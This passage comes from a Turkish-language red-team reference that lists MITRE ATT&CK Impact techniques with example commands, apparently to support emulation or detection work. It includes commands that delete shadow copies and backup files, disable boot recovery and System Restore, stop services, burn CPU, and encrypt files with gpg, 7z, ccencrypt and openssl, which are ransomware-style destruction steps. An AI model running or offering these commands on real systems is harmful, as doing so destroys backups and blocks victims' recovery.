    reboot
    halt -p
    halt -r
    halt --reboot
    poweroff
    poweroff -r 3
    poweroff --reboot
    shutdown /l
    ```
    
3. Resource Hijacking (T1496)
    
    Örnek komut:
    
    ```bash
    yes > /dev/null
    ```
    
4. Inhibit System Recovery (T1490)
    
    Örnek komut:
    
    ```powershell
    vssadmin.exe delete shadows /all /quiet
    ```
    
    ```powershell
    wmic.exe shadowcopy delete
    ```
    
    ```powershell
    wbadmin delete catalog -quiet
    ```
    
    ```powershell
    bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
    bcdedit.exe /set {default} recoveryenabled no
    ```
    
    ```powershell
    Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
    ```
    
    ```powershell
    del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
    ```
    
    ```powershell
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
    ```
    
    ```powershell
    vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%
    ```
    
5. Service Stop (T1489)
    
    ```powershell
    sc.exe stop #{service_name}
    net.exe stop #{service_name}
    taskkill.exe /f /im #{process_name}
    ```
    
6. Data Encrypted for Impact (T1486)
    
    ```bash
    echo "#{pwd_for_encrypted_file}" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}
    ```
    
    ```bash
    $which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}
    ```
    
    ```bash
    if [ $USER == "root" ]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi
    ```
    
    ```bash
    $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}
    $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}
    $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}
    ```
    

---

> *Bu rapor, bir dizi saldırı tekniğini ve bunları gerçekleştirmek için kullanılan örnek komutları içerir. Tüm teknikler ve alt teknikler ele alınmamıştır. Teknikler, dosyaları arama ve sıkıştırma, ele geçirilen sistemlerin kontrolü, veri sızdırma ve sistem kesintisi veya yok etme eylemlerini içerir. Her teknik için, PowerShell, bash ve diğer dillerde örnek komutlar sağlanmıştır. Eğer tekniklere veya alt tekniklere ekleme yapmak isterseniz lütfen benimle iletişime geçiniz.*
>
